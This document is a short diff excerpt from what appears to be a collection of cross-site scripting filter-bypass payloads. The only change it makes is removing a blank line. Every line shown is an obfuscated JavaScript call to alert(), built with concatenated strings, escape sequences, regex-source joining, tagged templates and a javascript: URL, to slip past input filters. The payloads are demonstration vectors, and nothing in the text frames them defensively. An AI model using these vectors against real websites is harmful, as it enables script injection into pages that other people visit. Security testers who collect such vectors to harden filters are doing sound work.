@@ -58,7 +58,6 @@ top[8680439..toString(30)](7);
 top[/al/.source+/ert/.source](8);
 top['al\x65rt'](9);
 open('java'+'script:ale'+'rt(11)');
-
 setTimeout`alert\u0028document.domain\u0029`;
 setTimeout('ale'+'rt(2)');
 setInterval('ale'+'rt(10)');
